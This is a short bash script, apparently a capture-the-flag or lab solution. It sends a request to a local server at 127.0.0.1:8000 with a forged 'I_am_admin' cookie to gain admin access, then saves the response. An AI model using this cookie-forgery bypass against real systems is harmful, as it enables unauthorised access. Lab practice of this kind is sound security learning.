#!/bin/bash

response=$(curl -H "Cookie: I_am_admin=b326b5062b2f0e69046810717534cb09" 127.0.0.1:8000)
echo $response > output